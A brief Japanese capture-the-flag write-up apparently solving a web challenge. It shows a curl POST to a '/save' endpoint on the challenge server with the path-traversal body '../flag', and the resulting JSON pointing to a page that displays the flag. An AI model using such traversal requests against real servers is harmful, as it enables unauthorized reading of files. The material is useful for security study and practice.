以下のcurlコマンドを実行する。アクセス先URLは適宜変更のこと。

```bash
curl 'http://34.170.146.252:8873/save' \
  -H 'Accept: */*' \
  -H 'Accept-Language: ja,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: text/plain' \
  -H 'Origin: http://34.170.146.252:8873' \
  -H 'Referer: http://34.170.146.252:8873/' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0' \
  --data-raw '../flag' \
  --insecure
```

すると、以下のようなレスポンスが返ってくる。

```json
{"location":"/result/abd20942.html"}
```

`http://34.170.146.252:8873/result/abd20942.html`にアクセスすると、フラグが表示される。